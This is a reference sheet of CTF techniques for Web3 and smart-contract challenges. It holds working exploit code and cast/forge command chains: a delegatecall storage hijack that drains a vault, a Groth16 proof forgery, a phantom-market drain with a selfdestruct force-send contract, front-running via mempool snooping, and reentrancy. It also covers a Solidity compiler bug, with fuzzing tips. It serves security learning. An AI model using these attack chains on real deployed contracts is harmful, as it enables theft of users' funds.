# CTF Web - Web3 / Blockchain Challenges

## Table of Contents
- [Challenge Infrastructure Pattern](#challenge-infrastructure-pattern)
  - [Auth Implementation (Python)](#auth-implementation-python)
- [EIP-1967 Proxy Pattern Exploitation](#eip-1967-proxy-pattern-exploitation)
- [ABI Coder v1 vs v2 - Dirty Address Bypass](#abi-coder-v1-vs-v2---dirty-address-bypass)
- [Solidity CBOR Metadata Stripping for Codehash Bypass](#solidity-cbor-metadata-stripping-for-codehash-bypass)
- [Non-Standard ABI Calldata Encoding](#non-standard-abi-calldata-encoding)
- [Solidity bytes32 String Encoding](#solidity-bytes32-string-encoding)
- [Complete Exploit Flow (House of Illusions)](#complete-exploit-flow-house-of-illusions)
- [Delegatecall Storage Context Abuse (EHAX 2026)](#delegatecall-storage-context-abuse-ehax-2026)
- [Groth16 Proof Forgery for Blockchain Governance (DiceCTF 2026)](#groth16-proof-forgery-for-blockchain-governance-dicectf-2026)
- [Phantom Market Unresolve + Force-Funding (DiceCTF 2026)](#phantom-market-unresolve--force-funding-dicectf-2026)
- [Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)](#solidity-transient-storage-clearing-helper-collision-solidity-0828-0833)
- [Web3 CTF Tips](#web3-ctf-tips)

---

## Challenge Infrastructure Pattern

1. **Auth**: GET `/api/auth/nonce` → sign with `personal_sign` → POST `/api/auth/login`
2. **Instance creation**: Call `factory.createInstance()` on-chain (requires testnet ETH)
3. **Exploit**: Interact with deployed instance contracts
4. **Check**: GET `/api/challenges/check-solution` → returns flag if `isSolved()` is true

### Auth Implementation (Python)
```python
from eth_account import Account
from eth_account.messages import encode_defunct
import requests

acct = Account.from_key(PRIVATE_KEY)
s = requests.Session()
nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']
msg = encode_defunct(text=nonce)
sig = acct.sign_message(msg)
r = s.post(f'{BASE}/api/auth/login', json={
    'signedNonce': '0x' + sig.signature.hex(),
    'nonce': nonce,
    'account': acct.address.lower()  # Challenge-specific: this server expected lowercase
})
s.cookies.set('token', r.json()['token'])
```

**Key notes:**
- Some CTF servers expect lowercase addresses (not EIP-55 checksummed) — check the frontend JS to confirm. This is NOT universal; other challenges may require checksummed format
- Bundle.js contains chain ID, contract addresses, and auth flow details
- Use `cast` (Foundry) for on-chain interactions: `cast call`, `cast send`, `cast storage`

---

## EIP-1967 Proxy Pattern Exploitation

**Storage slots:**
```text
Implementation: keccak256("eip1967.proxy.implementation") - 1
Admin:          keccak256("eip1967.proxy.admin") - 1
```

```bash
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc  # impl
cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103  # admin
```

**Key insight:** Proxy delegates calls to implementation, but storage lives on the proxy. `address(this)` in delegatecall = proxy address.

---

## ABI Coder v1 vs v2 - Dirty Address Bypass

Solidity 0.8.x defaults to ABI coder v2, which validates `address` parameters have zero upper 12 bytes. With `pragma abicoder v1`, no validation.

**Pattern (House of Illusions):**
1. Contract requires dirty address bytes but uses `address` type
2. ABI coder v2 rejects with empty revert data (`"0x"`)
3. Deploy with `pragma abicoder v1` → different bytecode, no validation
4. Swap implementation via proxy's upgrade function

**Detection:** Call reverts with empty data (`"0x"`) = ABI coder v2 validation.

---

## Solidity CBOR Metadata Stripping for Codehash Bypass

Proxy checks `keccak256(strippedCode) == ALLOWED_CODEHASH` where metadata is stripped.

```python
code = bytes.fromhex(bytecode[2:])
meta_len = int.from_bytes(code[-2:], 'big')
stripped = code[:len(code) - meta_len - 2]
codehash = keccak256(stripped)
```

---

## Non-Standard ABI Calldata Encoding

**Overlapping calldata:** When contract enforces `msg.data.length == 100` but has `(address, bytes)` params:
```text
Standard: 4 + 32(addr) + 32(offset=0x40) + 32(len) + 32(data) = 132 bytes
Crafted:  4 + 32(dirty_addr) + 32(offset=0x20) + 32(sigil_data) = 100 bytes
```
Offset `0x20` serves dual purpose: offset pointer AND bytes length.

---

## Solidity bytes32 String Encoding

`bytes32("0xAnan or Tensai?")` stores ASCII left-aligned with zero padding:
```text
0x3078416e616e206f722054656e7361693f000000000000000000000000000000
```

---

## Complete Exploit Flow (House of Illusions)

```bash
export PATH="$PATH:/Users/lcf/.foundry/bin"
RPC="https://ethereum-sepolia-rpc.publicnode.com"

forge create src/IllusionHouse.sol:IllusionHouse --private-key $KEY --rpc-url $RPC --broadcast
cast send $PROXY "reframe(address)" $NEW_IMPL --private-key $KEY --rpc-url $RPC
cast send $PROXY $CRAFTED_CALLDATA --private-key $KEY --rpc-url $RPC
cast send $PROXY "appointCurator(address)" $MY_ADDR --private-key $KEY --rpc-url $RPC
cast call $FACTORY "isSolved(address)(bool)" $MY_ADDR --rpc-url $RPC
```

---

## Delegatecall Storage Context Abuse (EHAX 2026)

**Pattern (Heist v1):** Vault contract with `execute()` that does `delegatecall` to a governance contract. `setGovernance()` has **no access control**.

**Storage layout awareness:** `delegatecall` runs callee code in caller's storage context. If vault has:
- Slot 0: `paused` (bool) + `fee` (uint248) — packed
- Slot 1: `admin` (address)
- Slot 2: `governance` (address)

Writing to slot 0/1 in the delegated contract modifies the vault's `paused` and `admin`.

**Attack chain:**
1. Deploy attacker contract matching vault's storage layout
2. `setGovernance(attacker_address)` — no access control
3. `execute(abi.encodeWithSignature("attack(address)", player))` — delegatecall
4. Attacker's `attack()` writes `paused=false` to slot 0, `admin=player` to slot 1
5. `withdraw()` — now authorized as admin with vault unpaused

```solidity
contract Attacker {
    bool public paused;      // slot 0 (match vault layout)
    uint248 public fee;      // slot 0
    address public admin;    // slot 1
    address public governance; // slot 2

    function attack(address _newAdmin) public {
        paused = false;
        admin = _newAdmin;
    }
}
```

```bash
# Deploy attacker
forge create Attacker.sol:Attacker --rpc-url $RPC --private-key $KEY
# Hijack governance
cast send $VAULT "setGovernance(address)" $ATTACKER --rpc-url $RPC --private-key $KEY
# Execute delegatecall
CALLDATA=$(cast calldata "attack(address)" $PLAYER)
cast send $VAULT "execute(bytes)" $CALLDATA --rpc-url $RPC --private-key $KEY
# Drain
cast send $VAULT "withdraw()" --rpc-url $RPC --private-key $KEY
```

**Key insight:** Always check if `setGovernance()` / `setImplementation()` / upgrade functions have access control. Unprotected governance setters + delegatecall = full storage control.

---

## Groth16 Proof Forgery for Blockchain Governance (DiceCTF 2026)

**Pattern (Housing Crisis):** DAO governance protected by Groth16 ZK proofs. Two ZK-specific vulnerabilities:

**Broken trusted setup (delta == gamma):** Trivially forge any proof:
```python
from py_ecc.bn128 import G1, G2, multiply, add, neg

# When vk_delta_2 == vk_gamma_2, set:
forged_A = vk_alpha1
forged_B = vk_beta2
forged_C = neg(vk_x)  # negate the public input accumulator
# This verifies for ANY public inputs
```

**Proof replay (unconstrained nullifier):** DAO never tracks used `proposalNullifierHash` values. Extract a valid proof from the setup contract's deployment transaction and replay it for every proposal.

**When to check in Web3 challenges:**
1. Compare `vk_delta_2` and `vk_gamma_2` — if equal, Groth16 is trivially broken
2. Check if the verifier contract tracks proof nullifiers
3. Look for valid proofs in deployment/setup transactions

---

## Phantom Market Unresolve + Force-Funding (DiceCTF 2026)

**Pattern (Housing Crisis):** Prediction market with DAO governance. Three combined vulnerabilities drain the market.

**Vulnerability 1 — Phantom market betting:**
`bet()` checks `marketResolution[market] == 0` but NOT whether the market formally exists (no `market < nextMarketIndex` check). Bet on phantom market IDs (beyond `nextMarketIndex`).

**Vulnerability 2 — State persistence on unresolve:**
When `createMarket()` later reaches the phantom market ID, it writes `marketResolution[id] = 0`. This effectively "unresolves" the market, but old `totalYesBet`/`totalNoBet` values persist, enabling a second cashout.

**Vulnerability 3 — Force-fund via selfdestruct:**
```solidity
// EIP-6780: selfdestruct in constructor sends ETH even to contracts without receive()
contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);  // Forces ETH into DAO
    }
}
// Deploy: new ForceSend{value: amount}(dao_address)
```

**Drain cycle:**
1. Force-fund DAO with `2*marketBalance` wei
2. Helper1 bets 1 wei NO on phantom market N
3. DAO bets `2*marketBalance` YES via delegatecall proposal
4. Resolve market NO → Helper1 cashouts (net zero for market, but `totalYesBet` persists)
5. `createMarket()` reaches N → writes `marketResolution[N]=0` (unresolve)
6. Helper2 bets 1 wei NO → resolve NO → Helper2 cashout = `1 + totalYesBet/2 = 1 + marketBalance`

**Key math:** Payout = `helperBet + helperBet * totalYesBet / totalNoBet = 1 + 1 * 2*mBal / 2 = 1 + mBal`. Market had `mBal + 1`, pays `1 + mBal` → balance = 0.

**Gotchas:**
- **EVM `.call` with insufficient balance silently fails** — size DAO bet so payout ≤ market balance
- **ethers.js BigInt:** Use `!== 0n` not `!== 0` for comparisons
- **EIP-6780 selfdestruct:** Must be in constructor (not runtime) for same-tx contract deletion, but ETH transfer works either way

**When to check:** Prediction markets / betting contracts — always test: can you bet on non-existent market IDs? Does market creation reset resolution state without clearing bet totals?

---

## Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)

**Affected:** Solidity 0.8.28 through 0.8.33, IR pipeline only (`--via-ir` flag). Fixed in 0.8.34.

**Root cause:** The IR pipeline generates Yul helper functions for `delete` operations. The helper name is derived from the value type but **omits the storage location** (persistent vs. transient). When a contract uses `delete` on both a persistent and transient variable of the same type, both generate identically-named helpers. Whichever compiles first determines the implementation — the other uses the **wrong opcode** (`sstore` instead of `tstore` or vice versa).

**Vulnerable pattern:**
```solidity
contract Vulnerable {
    address public owner;                    // persistent, slot 0
    mapping(uint256 => address) public m;    // persistent
    address transient _lock;                 // transient

    function guarded() external {
        require(_lock == address(0), "locked");
        _lock = msg.sender;
        // BUG: delete _lock uses sstore (persistent) instead of tstore
        // This writes zero to slot 0, overwriting owner!
        delete _lock;
    }
}
```

**Two exploit directions:**
1. **Transient `delete` uses `sstore`:** Overwrites persistent storage (slot 0 = owner/access control variables). Transient variable remains set, breaking reentrancy locks
2. **Persistent `delete` uses `tstore`:** Approvals/mappings cannot be revoked. The `tstore` write is discarded at transaction end

**Cross-type collisions via array clearing:** Array `.pop()`, `delete []`, and shrinking operations clear at slot granularity using `uint256` helpers. A `bool[]` clearing collides with `delete uint256 transient _temp`.

**Detection:**
```bash
# Compare Yul output — if storage_set_to_zero_ calls change to
# transient_storage_set_to_zero_ in 0.8.34, the contract was affected
solc --via-ir --ir Contract.sol > yul_output.txt
```

**Workaround:** Replace `delete _lock` with `_lock = address(0)` — direct zero assignment uses the correct opcode path.

**Key insight:** The bug requires all three conditions: `--via-ir` compilation, `delete` on a transient variable, and a matching-type persistent `delete` in the same compilation unit. No compiler warning is produced, and incorrect storage operations do not revert — they silently corrupt state.

---

## Web3 CTF Tips

- **Factory pattern:** Instance = per-player contract. Check `playerToInstance(address)` mapping.
- **Proxy fallback:** All unrecognized calls go through delegatecall to implementation.
- **Upgrade functions:** Check if they have access control! Many challenges leave these open.
- **address(this) in delegatecall:** Always refers to the proxy, not the implementation.
- **Storage layout:** mappings use `keccak256(abi.encode(key, slot))` for storage location.
- **Empty revert data (`0x`):** Usually ABI decoder validation failure.
- **Contract nonce:** Starts at 1. Nonce = 1 means no child contracts created.
- **Derive child addresses:** `keccak256(rlp.encode([parent_address, nonce]))[-20:]`
- **Foundry tools:** `cast call` (read), `cast send` (write), `cast storage` (raw slots), `forge create` (deploy)
- **Sepolia faucets:** Google Cloud faucet (0.05 ETH), Alchemy, QuickNode

---

## Solidity `private` Storage Leak via `eth_getStorageAt` (source: Midnightflag 2025)

**Trigger:** challenge contract carries game state in `private` variables; attacker has a live RPC endpoint.
**Signals:** `private` keyword on non-constant state vars; challenge exposes `CHAIN_RPC_URL`.
**Mechanic:** `private` is a Solidity source-level visibility — storage remains public. Enumerate packed slots via `eth_getStorageAt(addr, slot)`; for mappings use `keccak256(abi.encode(key, slot))`. Reconstruct state offline (e.g. Sudoku board layout), solve, then call the exposed solve function. Always try this before any contract-level cleverness.
```bash
cast storage "$ADDR" 0 --rpc-url "$RPC"   # foundry one-liner
```

## SELFDESTRUCT + CREATE2 Code-Swap After Size Check (source: Midnightflag 2025)

**Trigger:** contract validates `extcodesize(addr) > 0 && <= N` once, then stores `addr`, later `CALL`s it; attacker-supplied contract deployable via CREATE2.
**Signals:** one-time bytecode size check + persistent storage; challenge lets you deploy via CREATE2 with attacker-chosen salt.
**Mechanic:** deploy a tiny stub that passes the size check, then `SELFDESTRUCT`, then redeploy via CREATE2 at the same address with arbitrary bytecode. When the contract later `CALL`s the stored addr, it runs the new code. Post-Dencun (EIP-6780) caveat: `SELFDESTRUCT` only deletes in the *same tx* as creation — the technique still works for contracts created-this-tx.

## Ethereum `txpool_content` / `eth_pendingTransactions` Snooping (source: pwn.college AoP 2025)

**Trigger:** challenge RPC exposes `txpool_content` or `eth_pendingTransactions`; multiplayer setting where admin txs appear in mempool.
**Signals:** RPC method list includes `txpool_*`; multiple players' transactions in-flight.
**Mechanic:** read pending admin/player txs, copy signed payloads, front-run, or selectively mine blocks whose mempool state maximises attacker balance. Pattern: any Ethereum CTF exposing txpool RPCs is sniffable.

## Cross-Function Reentrancy (Guarded + Unguarded Pair) (source: HTB Business 2025 Spectral)

**Trigger:** `nonReentrant` modifier on `withdraw()`; sibling function `flashAction()` shares the same balance mapping but is **not** guarded and calls target before state update.
**Signals:** two external functions touching the same storage slot; only one has the modifier; CEI order wrong in the unguarded one.
**Mechanic:** attack from the unguarded path — reenter through it while `withdraw` lock doesn't apply (different selector). Drain the shared mapping. Fix: modifier must cover every external function touching shared state.

## Foundry Invariant Fuzzing Discovery (source: 2025-2026 web3 CTFs + Echidna/Foundry workflows)

**Trigger:** challenge ships `foundry.toml` + `test/` with functions named `invariant_*()`, `statefulFuzz_*()`, or files matching `Invariant*.t.sol`.
**Signals:** `[invariant]` block in `foundry.toml`; `StdInvariant` import; `targetContract()` / `targetSelector()` helpers.
**Mechanic:** these are property-based fuzzers — the challenge authors often *add* invariants that the challenge contract should preserve; your job is to find a calldata sequence violating one. Run `forge test --mt invariant_ -vvvv`; Foundry prints the failing sequence as `[FAIL] invariant_total_supply_constant() (runs: 256, calls: 15000, reverts: 0)` plus the replay steps. Tune:
- `runs = 1000`, `depth = 50` (default 256/15 is too shallow for deep state).
- `fail_on_revert = false` catches invariants that break only during revert-adjacent states.
- `targetContract` — if the challenge forks mainnet, exclude the forked address to save fuzzing budget.

Common wins: accounting desync (`totalSupply != Σ balances`), `stake > 0 ⇒ unstakeable` violated after flashloan, ERC4626 `convertToAssets(convertToShares(x)) == x` only holds when fee = 0.

## Halmos Symbolic-Execution Invariant Check

**Trigger:** challenge contract has a bounded invariant you can assert but Foundry fuzzer times out on the state space.
**Signals:** loop count ≤ 10, branching `if`/`require` under 20 constraints, no external `call` that Halmos can't model.
**Mechanic:** `halmos --function check_invariant --loop 5` runs Z3-backed symbolic execution; it either proves the assertion or returns a counterexample. Unlike fuzzing, it enumerates reachable states; unlike full symbolic (Mythril), it scales to real contracts.

```solidity
// test/InvariantCheck.t.sol
contract CheckTest {
    Target t;
    function check_totalSupplyMatches(uint256 a, uint256 b) public {
        t.mint(address(this), a);
        t.burn(b);
        assert(t.totalSupply() == t.balanceOf(address(this)));
    }
}
// Run: halmos --function check_totalSupplyMatches
```

`--symbolic-storage` makes initial contract storage symbolic (dangerous vs real constructor constraints) — useful when the CTF initial state is unknown.

## Differential Fuzzing Two Implementations (source: 2024-2026 DeFi rewrite audits)

**Trigger:** challenge provides a "reference" contract (audited) + an "optimised" one (assembly / Yul / modified math). They should behave identically on all inputs.
**Signals:** two contracts with identical external interface; filename pairs `FooV1.sol` / `FooV2.sol` or `Safe.sol` / `Optimized.sol`.
**Mechanic:** write a Foundry fuzz test that calls each with the same calldata and `assertEq` the full storage snapshot (or key return value). Any divergence is the bug — usually an overflow in the assembly path, or a missing check the optimised path skipped.

```solidity
function testDiff(bytes calldata input) public {
    (bool o1, bytes memory r1) = address(v1).call(input);
    (bool o2, bytes memory r2) = address(v2).call(input);
    assertEq(o1, o2);
    assertEq(keccak256(r1), keccak256(r2));
}
```

## Cast + Tenderly Storage Diff for Private-State Leak

**Trigger:** contract marks state `private` but challenge needs its value; live RPC endpoint provided.
**Signals:** deployer visible on Etherscan; contract has unverified slots.
**Mechanic:** `cast storage <addr> <slot>` reads any slot by index regardless of visibility. Slots are laid out per Solidity layout rules (`forge inspect Contract storage-layout`). For mapping entries: `slot = keccak256(abi.encode(key, mapping_slot))`. For arrays: `slot_i = keccak256(baseslot) + i`. Combined with a known deployer tx, `tenderly fork` reproduces the deploy state locally and `forge inspect` gives the layout. See `cves.md` for live examples.
